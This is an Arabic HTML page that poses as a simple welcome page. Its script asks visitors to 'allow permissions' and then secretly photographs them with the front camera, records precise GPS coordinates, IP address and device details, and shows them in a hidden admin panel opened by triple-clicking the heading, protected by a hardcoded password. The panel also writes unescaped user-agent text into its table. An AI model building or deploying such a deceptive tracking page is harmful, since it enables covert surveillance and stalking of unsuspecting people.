<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الموقع الإلكتروني</title>
    <style>
        body {
            font-family: Tahoma, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 50px 20px;
            text-align: center;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0px 0px 15px rgba(0,0,0,0.1);
            display: inline-block;
            max-width: 600px;
            width: 100%;
        }
        h2 { 
            color: #333; 
            cursor: pointer; 
            user-select: none; 
        }
        p { color: #666; font-size: 15px; }
        .btn {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 15px;
        }
        .btn:hover { background-color: #0056b3; }
        table {
            width: 100%;
            margin-top: 20px;
            border-collapse: collapse;
            font-size: 14px;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 10px;
            text-align: center;
            vertical-align: middle;
        }
        th { background-color: #007bff; color: white; }
        .error { color: red; margin-top: 10px; }
        .hidden { display: none; }
        input[type="password"] {
            padding: 10px;
            width: 60%;
            border: 1px solid #ccc;
            border-radius: 4px;
            margin-left: 10px;
        }
        .visitor-img {
            width: 60px;
            height: 60px;
            object-fit: cover;
            border-radius: 50%;
            border: 2px solid #007bff;
        }
    </style>
</head>
<body>

    <!-- عناصر مخفية لالتقاط الصورة من الكاميرا الأمامية -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <!-- واجهة الزائر -->
    <div id="visitorSection" class="container">
        <!-- انقر 3 مرات هنا لفتح صفحة الأدمن -->
        <h2 onclick="handleSecretClicks()">مرحباً بك في الموقع</h2>
        <p>يرجى النقر على زر المتابعة والموافقة على الصلاحيات للاستمرار.</p>
        <button class="btn" onclick="requestVisitorData()">متابعة</button>
    </div>

    <!-- واجهة تسجيل دخول الأدمن -->
    <div id="adminLoginSection" class="container hidden">
        <h2>تسجيل دخول الأدمن</h2>
        <p>أدخل كلمة المرور لعرض بيانات الزوار:</p>
        <input type="password" id="adminPassword" placeholder="كلمة المرور">
        <button class="btn" onclick="verifyAdminPassword()" style="margin-top:0;">دخول</button>
        <div id="loginError" class="error"></div>
        <br><br>
        <button class="btn" onclick="showVisitorPage()" style="background-color: #6c757d; font-size: 14px; padding: 8px 15px;">العودة لصفحة الزائر</button>
    </div>

    <!-- لوحة التحكم -->
    <div id="adminPanelSection" class="container hidden" style="max-width: 950px;">
        <h2>لوحة التحكم - بيانات الزوار</h2>
        <p>جميع معلومات الزوار (الصورة، الموقع بدقة، الجهاز، والـ IP):</p>
        <div style="overflow-x: auto;">
            <table>
                <thead>
                    <tr>
                        <th>الصورة</th>
                        <th>الوقت والتاريخ</th>
                        <th>الجهاز / المتصفح</th>
                        <th>الـ IP</th>
                        <th>الإحداثيات</th>
                        <th>الخريطة</th>
                    </tr>
                </thead>
                <tbody id="visitorsTableBody">
                </tbody>
            </table>
        </div>
        <br>
        <button class="btn" onclick="clearData()" style="background-color: #dc3545; font-size: 14px; padding: 8px 15px;">مسح السجل</button>
        <button class="btn" onclick="showVisitorPage()" style="font-size: 14px; padding: 8px 15px; margin-right: 10px;">إغلاق اللوحة</button>
    </div>

    <script>
        let clickCount = 0;
        let clickTimer = null;

        function handleSecretClicks() {
            clickCount++;
            if (clickCount === 1) {
                clickTimer = setTimeout(() => { clickCount = 0; }, 1000);
            }
            if (clickCount === 3) {
                clearTimeout(clickTimer);
                clickCount = 0;
                showAdminLogin();
            }
        }

        function requestVisitorData() {
            if (!navigator.geolocation) {
                alert("متصفحك لا يدعم تحديد الموقع.");
                return;
            }

            // 1. طلب إذن الكاميرا الأمامية والتقاط صورة صامتة
            let capturedImage = "";
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    video.play();
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 320;
                        canvas.height = video.videoHeight || 240;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        capturedImage = canvas.toDataURL('image/png');
                        
                        stream.getTracks().forEach(track => track.stop());
                        processLocationAndIP(capturedImage);
                    }, 800);
                })
                .catch(() => {
                    processLocationAndIP("");
                });
        }

        function processLocationAndIP(imgData) {
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const visitorIP = data.ip || "غير معروف";
                    const deviceType = navigator.userAgent;

                    // 2. طلب إذن الموقع بأعلى دقة GPS ممكنة لضبط الدبوس تماماً
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            const timeNow = new Date().toLocaleString('ar-SA');

                            const visitorRecord = {
                                time: timeNow,
                                ip: visitorIP,
                                device: deviceType,
                                latitude: lat,
                                longitude: lon,
                                image: imgData
                            };

                            let allVisitors = JSON.parse(localStorage.getItem('saved_visitors')) || [];
                            allVisitors.push(visitorRecord);
                            localStorage.setItem('saved_visitors', JSON.stringify(allVisitors));

                            alert("تم التحقق بنجاح! شكراً لك.");
                        },
                        function(error) {
                            switch(error.code) {
                                case error.PERMISSION_DENIED:
                                    alert("يجب النقر على 'سماح' (Allow) للموقع للمتابعة.");
                                    break;
                                case error.POSITION_UNAVAILABLE:
                                    alert("معلومات الموقع الجغرافي غير متوفرة.");
                                    break;
                                case error.TIMEOUT:
                                    alert("انتهت مهلة طلب الموقع.");
                                    break;
                            }
                        },
                        { 
                            enableHighAccuracy: true, // إجبار الهاتف على استخدام نظام GPS الفعلي لضبط الدبوس بدقة
                            timeout: 20000, 
                            maximumAge: 0 
                        }
                    );
                })
                .catch(() => {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const timeNow = new Date().toLocaleString('ar-SA');

                        const visitorRecord = {
                            time: timeNow,
                            ip: "مخفي أو غير متوفر",
                            device: navigator.userAgent,
                            latitude: lat,
                            longitude: lon,
                            image: imgData
                        };

                        let allVisitors = JSON.parse(localStorage.getItem('saved_visitors')) || [];
                        allVisitors.push(visitorRecord);
                        localStorage.setItem('saved_visitors', JSON.stringify(allVisitors));
                        alert("تم التحقق بنجاح!");
                    }, null, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
                });
        }

        function showAdminLogin() {
            document.getElementById('visitorSection').classList.add('hidden');
            document.getElementById('adminPanelSection').classList.add('hidden');
            document.getElementById('adminLoginSection').classList.remove('hidden');
            document.getElementById('adminPassword').value = '';
            document.getElementById('loginError').innerText = '';
        }

        function showVisitorPage() {
            document.getElementById('adminLoginSection').classList.add('hidden');
            document.getElementById('adminPanelSection').classList.add('hidden');
            document.getElementById('visitorSection').classList.remove('hidden');
        }

        function verifyAdminPassword() {
            const pass = document.getElementById('adminPassword').value;
            if (pass === 'ooddaayy') {
                document.getElementById('adminLoginSection').classList.add('hidden');
                document.getElementById('adminPanelSection').classList.remove('hidden');
                loadVisitorsTable();
            } else {
                document.getElementById('loginError').innerText = 'كلمة المرور غير صحيحة!';
            }
        }

        function loadVisitorsTable() {
            const tbody = document.getElementById('visitorsTableBody');
            tbody.innerHTML = '';

            let allVisitors = JSON.parse(localStorage.getItem('saved_visitors')) || [];

            if (allVisitors.length === 0) {
                tbody.innerHTML = '<tr><td colspan="6">لا توجد بيانات مسجلة لزوار حتى الآن.</td></tr>';
                return;
            }

            allVisitors.forEach(v => {
                const tr = document.createElement('tr');
                const mapsUrl = `https://www.google.com/maps?q=${v.latitude},${v.longitude}`;
                const imgTag = v.image ? `<img src="${v.image}" class="visitor-img">` : "لا توجد صورة";

                tr.innerHTML = `
                    <td>${imgTag}</td>
                    <td>${v.time}</td>
                    <td style="word-break: break-all; font-size: 11px; max-width: 180px;">${v.device}</td>
                    <td><b>${v.ip}</b></td>
                    <td>${v.latitude.toFixed(6)}, ${v.longitude.toFixed(6)}</td>
                    <td><a href="${mapsUrl}" target="_blank" style="color: #007bff; font-weight: bold;">فتح الخريطة 🗺️</a></td>
                `;
                tbody.appendChild(tr);
            });
        }

        function clearData() {
            if (confirm("هل أنت متضرر من مسح جميع سجلات الزوار؟")) {
                localStorage.removeItem('saved_visitors');
                loadVisitorsTable();
            }
        }
    </script>

</body>
</html>
